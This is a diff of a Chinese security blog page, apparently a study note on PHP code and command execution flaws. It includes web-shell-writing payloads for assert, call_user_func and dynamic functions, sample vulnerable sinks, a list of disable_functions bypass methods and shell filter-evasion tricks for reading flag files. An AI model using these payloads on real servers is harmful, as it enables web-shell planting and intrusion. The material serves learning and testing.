@@ -22,14 +22,14 @@
 
   <meta name="description" content="remote command&#x2F;code execute远程命令&#x2F;代码执行简称RCE。远程代码执行，不仅会出现在php也会出现在java,python等编程语言中。 远程代码执行漏洞的产生原因  对用户输入过滤不严,用户可以通过请求将代码注入到应用中由服务器执行">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码-命令执行漏洞">
+<meta property="og:title" content="PHP代码&#x2F;命令执行漏洞">
 <meta property="og:url" content="http://atsud0.me/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
 <meta property="og:description" content="remote command&#x2F;code execute远程命令&#x2F;代码执行简称RCE。远程代码执行，不仅会出现在php也会出现在java,python等编程语言中。 远程代码执行漏洞的产生原因  对用户输入过滤不严,用户可以通过请求将代码注入到应用中由服务器执行">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200805_111026.jpg">
 <meta property="article:published_time" content="2020-05-30T06:16:46.000Z">
-<meta property="article:modified_time" content="2021-02-23T15:38:50.457Z">
+<meta property="article:modified_time" content="2021-05-09T16:25:52.632Z">
 <meta property="article:author" content="atsud0">
 <meta property="article:tag" content="Windows">
 <meta property="article:tag" content="Linux">
@@ -51,7 +51,7 @@
   };
 </script>
 
-  <title>代码-命令执行漏洞 | 雪之下二丁目鹤岗八幡宫</title>
+  <title>PHP代码/命令执行漏洞 | 雪之下二丁目鹤岗八幡宫</title>
   
     <script>
       function sendPageView() {
@@ -147,7 +147,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">207</span></a>
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">208</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -157,7 +157,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">163</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">164</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -229,7 +229,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          代码-命令执行漏洞
+          PHP代码/命令执行漏洞
         </h1>
 
         <div class="post-meta">
@@ -246,7 +246,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+                <time title="Modified: 2021-05-10 00:25:52" itemprop="dateModified" datetime="2021-05-10T00:25:52+08:00">2021-05-10</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -271,14 +271,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>4.8k</span>
+              <span>5.5k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>4 mins.</span>
+              <span>5 mins.</span>
             </span>
 
         </div>
@@ -323,11 +323,19 @@
 
 <figure class="highlight plain"><figcaption><span>call_user_func_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fun&#x3D;assert&amp;para&#x3D;fwrite(fopen(&#39;shell.php&#39;,&#39;a+&#39;),&#39;&lt;?php eval($_POST[a])?&gt;&#39;)</span><br></pre></td></tr></table></figure>
 
+<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_POST[<span class="string">'cmd'</span>];</span><br><span class="line">$array[<span class="number">0</span>]=$cmd;</span><br><span class="line">call_user_func_array(<span class="string">"assert"</span>,$array)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
 
 <h3 id="a-b-动态函数"><a href="#a-b-动态函数" class="headerlink" title="$a($b)动态函数"></a>$a($b)动态函数</h3><p>动态函数<code>$a($b)</code>和<code>call_user_func()</code>利用方法一样.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">a($b);</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><figcaption><span>call_user_func_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;assert&amp;b&#x3D;fwrite(fopen(&#39;shell.php&#39;,&#39;a+&#39;),&#39;&lt;?php eval($_POST[a])?&gt;&#39;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map()函数"></a>array_map()函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$func=$_GET[<span class="string">'func'</span>];</span><br><span class="line">$cmd=$_POST[<span class="string">'cmd'</span>];</span><br><span class="line">$array[<span class="number">0</span>]=$cmd;</span><br><span class="line">$new_array=array_map($func,$array);</span><br><span class="line"><span class="keyword">echo</span> $new_array;</span><br></pre></td></tr></table></figure>
+
+
 
 
 <p>防御方式:</p>
@@ -363,13 +371,19 @@
 
 
 <h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>成功输出结果并返回结果的最后一行,失败返回<code>False</code>.</p>
-<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>函数实际上是反引号的实体(`),不输出结果,返回执行结果.</p>
-<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h4><p>和<code>shell_exec</code>一样,不输出结果,返回执行结果.</p>
+<p>另外ob_start()这个函数也行..不过也是要system支持,如果system被禁用.也没得用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">//注意，这个只显示结果的第一行，因此基本只能执行whoami</span></span><br><span class="line"><span class="comment">//ob_start：打开缓冲区,需要system函数开启</span></span><br><span class="line">$a = <span class="string">'system'</span>;</span><br><span class="line">ob_start($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$_POST[cmd]"</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>函数实际上是反引号的实体(`),如果shell_exec被禁用了,反引号也是用不了的,不输出结果,返回执行结果.</p>
 <h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>直接将结果输出到浏览器,不返回任何值,而且可以输出二进制结果.</p>
 <h4 id="popen-command-mode"><a href="#popen-command-mode" class="headerlink" title="popen(command,mode)"></a>popen(command,mode)</h4><p>使用command打开进程文件指针,将字符串作为系统命令执行,但是函数既不输出结果也不返回命名结果,而是返回一个文件命令指针.</p>
 <p>command-需要执行的命令<br>mode(r/x) 规定连接模式,r只读,x只写</p>
 <figure class="highlight plain"><figcaption><span>popen_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;echo ^&lt;?php phpinfo()?^&gt; &gt; shell.php </span><br></pre></td></tr></table></figure>
 <p>windows<code>cmd</code>里面的转义符号是<code>^</code>号</p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>类似于proc_open,pcntl_exec,pcntl_fork这些。。</p>
 <h4 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h4><table>
 <thead>
 <tr>
@@ -418,7 +432,10 @@
 <li>命令执行，直接执行操作系统命令</li>
 <li>命令执行，特殊的代码执行,只是执行的语句是具有执行命令能力的函数</li>
 </ul>
-<h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><h3 id="Linux的命令执行中当空格被过滤"><a href="#Linux的命令执行中当空格被过滤" class="headerlink" title="Linux的命令执行中当空格被过滤"></a>Linux的命令执行中当空格被过滤</h3><h4 id="IFS-代替空格-bash"><a href="#IFS-代替空格-bash" class="headerlink" title="${IFS}代替空格(bash)"></a>${IFS}代替空格(bash)</h4><p>类似于这个靶机的情况:<a href="/2020/06/14/Vulnhub-Dmv/" title="Vulnhub-Dmv-1">Vulnhub-Dmv-1</a></p>
+<h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><h3 id="Disable-functions"><a href="#Disable-functions" class="headerlink" title="Disable_functions"></a>Disable_functions</h3><p>蚁剑有一个绕过disable_functions的插件</p>
+<p><a href="https://github.com/AntSword-Store/as_bypass_php_disable_functions" target="_blank" rel="noopener">as_bypass_php_disable_functions</a></p>
+<p>看了下主要使用的是以下几种方法，以后有空补充下手动绕过的内容。</p>
+<h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><h4 id="PHP-FPM-FCGI"><a href="#PHP-FPM-FCGI" class="headerlink" title="PHP-FPM/FCGI"></a>PHP-FPM/FCGI</h4><h4 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h4><h4 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h4><h4 id="GC-with-Certain-Destructors-UAF"><a href="#GC-with-Certain-Destructors-UAF" class="headerlink" title="GC with Certain Destructors UAF"></a>GC with Certain Destructors UAF</h4><h4 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h4><h4 id="PHP7-FFI"><a href="#PHP7-FFI" class="headerlink" title="PHP7 FFI"></a>PHP7 FFI</h4><h3 id="Linux的命令执行中当空格被过滤"><a href="#Linux的命令执行中当空格被过滤" class="headerlink" title="Linux的命令执行中当空格被过滤"></a>Linux的命令执行中当空格被过滤</h3><h4 id="IFS-代替空格-bash"><a href="#IFS-代替空格-bash" class="headerlink" title="${IFS}代替空格(bash)"></a>${IFS}代替空格(bash)</h4><p>类似于这个靶机的情况:<a href="/2020/06/14/Vulnhub-Dmv/" title="Vulnhub-Dmv-1">Vulnhub-Dmv-1</a></p>
 <p>使用${IFS}代替空格。</p>
 <ul>
 <li><a href="https://www.cnblogs.com/cocowool/archive/2013/01/15/2861904.html" title="" target="">shell:处理文件中的空格</a>
@@ -450,7 +467,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">echo \c\a\t\ f\l\a\g.php</span><br><span class="line">cat flag.php</span><br><span class="line"></span><br><span class="line">echo \c\a\t\ f\l\a\g.php &gt;4</span><br><span class="line"></span><br><span class="line">cat 4</span><br><span class="line">cat flag.php</span><br><span class="line"></span><br><span class="line">bash 4</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
 
 <p>要注意的是引号要成对出现。并且单引号，双引号也能和``$()来配合使用</p>
-<h4 id="使用一个内容为空的变量名"><a href="#使用一个内容为空的变量名" class="headerlink" title="使用一个内容为空的变量名"></a>使用一个内容为空的变量名</h4><p>没有赋值的变量，在bash中都是为空。比如<br><img src="https://images.atsud0.me/images/post/Screenshot_20200805_111026.jpg" alt=""></p>
+<h4 id="使用一个内容为空的变量名"><a href="#使用一个内容为空的变量名" class="headerlink" title="使用一个内容为空的变量名"></a>使用一个内容为空的变量名</h4><p>没有赋值的变量，在bash中都是为空。比如<br><img src="https://images.atsud0.me/images/post/Screenshot_20200805_111026.jpg" style="zoom:50%;" /></p>
 <p>所以就可以使用这样的方法来绕过</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c$3at fl$&#123;fff&#125;ag.php</span><br></pre></td></tr></table></figure>
 
@@ -479,6 +496,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat [f][l][a][g]?php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
 
 <p>关于linux下通配符可以看<a href="https://www.cnblogs.com/lixuwu/p/7816335.html" target="_blank" rel="noopener">Linux文件名匹配</a></p>
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/-qing-/p/10819069.html#_label" target="_blank" rel="noopener">php中代码执行&amp;&amp;命令执行函数</a></p>
 
     </div>
 
@@ -494,7 +513,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="http://atsud0.me/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="代码-命令执行漏洞">http://atsud0.me/2020/05/30/远程代码-命令执行/</a>
+    <a href="http://atsud0.me/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="PHP代码/命令执行漏洞">http://atsud0.me/2020/05/30/远程代码-命令执行/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
@@ -583,7 +602,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php代码执行漏洞相关函数"><span class="nav-number">1.</span> <span class="nav-text">php代码执行漏洞相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-number">1.1.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-number">1.2.</span> <span class="nav-text">assert</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace"><span class="nav-number">1.3.</span> <span class="nav-text">preg_replace</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func"><span class="nav-number">1.4.</span> <span class="nav-text">call_user_func</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-b-动态函数"><span class="nav-number">1.5.</span> <span class="nav-text">$a($b)动态函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行漏洞相关函数"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行漏洞相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-number">2.1.1.</span> <span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-number">2.1.2.</span> <span class="nav-text">system()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell-exec"><span class="nav-number">2.1.3.</span> <span class="nav-text">shell_exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反引号"><span class="nav-number">2.1.4.</span> <span class="nav-text">反引号&#96;&#96;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#passthru"><span class="nav-number">2.1.5.</span> <span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen-command-mode"><span class="nav-number">2.1.6.</span> <span class="nav-text">popen(command,mode)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令连接符"><span class="nav-number">2.1.7.</span> <span class="nav-text">命令连接符</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令和代码执行的本质"><span class="nav-number">3.</span> <span class="nav-text">命令和代码执行的本质</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些绕过方法"><span class="nav-number">4.</span> <span class="nav-text">一些绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux的命令执行中当空格被过滤"><span class="nav-number">4.1.</span> <span class="nav-text">Linux的命令执行中当空格被过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IFS-代替空格-bash"><span class="nav-number">4.1.1.</span> <span class="nav-text">${IFS}代替空格(bash)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-gt-重定向符代替"><span class="nav-number">4.1.2.</span> <span class="nav-text">&lt;&gt;重定向符代替</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#突破黑名单绕过"><span class="nav-number">4.2.</span> <span class="nav-text">(突破黑名单绕过)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接"><span class="nav-number">4.2.1.</span> <span class="nav-text">拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64-编码"><span class="nav-number">4.2.2.</span> <span class="nav-text">base64 编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用单引号-双引号-反斜杠"><span class="nav-number">4.2.3.</span> <span class="nav-text">使用单引号,双引号,反斜杠</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用一个内容为空的变量名"><span class="nav-number">4.2.4.</span> <span class="nav-text">使用一个内容为空的变量名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通配符绕过"><span class="nav-number">4.2.5.</span> <span class="nav-text">通配符绕过</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php代码执行漏洞相关函数"><span class="nav-number">1.</span> <span class="nav-text">php代码执行漏洞相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-number">1.1.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-number">1.2.</span> <span class="nav-text">assert</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace"><span class="nav-number">1.3.</span> <span class="nav-text">preg_replace</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func"><span class="nav-number">1.4.</span> <span class="nav-text">call_user_func</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func-array"><span class="nav-number">1.5.</span> <span class="nav-text">call_user_func_array()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-b-动态函数"><span class="nav-number">1.6.</span> <span class="nav-text">$a($b)动态函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-map-函数"><span class="nav-number">1.7.</span> <span class="nav-text">array_map()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行漏洞相关函数"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行漏洞相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-number">2.1.1.</span> <span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-number">2.1.2.</span> <span class="nav-text">system()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell-exec"><span class="nav-number">2.1.3.</span> <span class="nav-text">shell_exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#passthru"><span class="nav-number">2.1.4.</span> <span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen-command-mode"><span class="nav-number">2.1.5.</span> <span class="nav-text">popen(command,mode)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他"><span class="nav-number">2.1.6.</span> <span class="nav-text">其他</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令连接符"><span class="nav-number">2.1.7.</span> <span class="nav-text">命令连接符</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令和代码执行的本质"><span class="nav-number">3.</span> <span class="nav-text">命令和代码执行的本质</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些绕过方法"><span class="nav-number">4.</span> <span class="nav-text">一些绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Disable-functions"><span class="nav-number">4.1.</span> <span class="nav-text">Disable_functions</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LD-PRELOAD"><span class="nav-number">4.1.1.</span> <span class="nav-text">LD_PRELOAD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-FPM-FCGI"><span class="nav-number">4.1.2.</span> <span class="nav-text">PHP-FPM&#x2F;FCGI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache-Mod-CGI"><span class="nav-number">4.1.3.</span> <span class="nav-text">Apache Mod CGI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Json-Serializer-UAF"><span class="nav-number">4.1.4.</span> <span class="nav-text">Json Serializer UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GC-with-Certain-Destructors-UAF"><span class="nav-number">4.1.5.</span> <span class="nav-text">GC with Certain Destructors UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Backtrace-UAF"><span class="nav-number">4.1.6.</span> <span class="nav-text">Backtrace UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP7-FFI"><span class="nav-number">4.1.7.</span> <span class="nav-text">PHP7 FFI</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux的命令执行中当空格被过滤"><span class="nav-number">4.2.</span> <span class="nav-text">Linux的命令执行中当空格被过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IFS-代替空格-bash"><span class="nav-number">4.2.1.</span> <span class="nav-text">${IFS}代替空格(bash)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-gt-重定向符代替"><span class="nav-number">4.2.2.</span> <span class="nav-text">&lt;&gt;重定向符代替</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#突破黑名单绕过"><span class="nav-number">4.3.</span> <span class="nav-text">(突破黑名单绕过)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接"><span class="nav-number">4.3.1.</span> <span class="nav-text">拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64-编码"><span class="nav-number">4.3.2.</span> <span class="nav-text">base64 编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用单引号-双引号-反斜杠"><span class="nav-number">4.3.3.</span> <span class="nav-text">使用单引号,双引号,反斜杠</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用一个内容为空的变量名"><span class="nav-number">4.3.4.</span> <span class="nav-text">使用一个内容为空的变量名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通配符绕过"><span class="nav-number">4.3.5.</span> <span class="nav-text">通配符绕过</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -599,7 +618,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">163</span>
+          <span class="site-state-item-count">164</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -612,7 +631,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/index.html">
           
-        <span class="site-state-item-count">207</span>
+        <span class="site-state-item-count">208</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -682,13 +701,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">485k</span>
+    <span title="Symbols count total">511k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">7:21</span>
+    <span title="Reading time total">7:45</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
   </div>
